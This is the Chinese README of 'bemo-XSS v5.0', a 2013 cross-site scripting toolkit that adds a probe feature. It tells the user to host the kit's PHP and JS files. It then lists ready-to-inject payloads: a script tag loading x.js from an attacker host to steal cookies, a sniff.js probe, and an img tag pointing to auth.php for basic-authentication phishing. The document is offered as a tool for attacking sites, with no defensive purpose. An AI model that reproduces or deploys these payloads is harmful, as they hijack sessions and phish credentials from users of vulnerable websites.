bemo-XSS v5.0
======================================================
增加探针功能
======================================================


上传到支持smtp的php空间，自行修改x.js,x.php,auth.php,sniff.js中参数。




cookies窃取利用示例：
<script src="http://xxx.com/x.js"></script>

探针功能示例：
<script src=http://mydns.com/sniff.js></script>


基础认证钓鱼利用示例：
在任何可插入的地方引用http://mydns.com/auth.php
或者<img src=http://mydns.com/auth.php>


                        
                            by 笔墨 2013-08-08
                               

                            联系方式:bemo@live.cn




                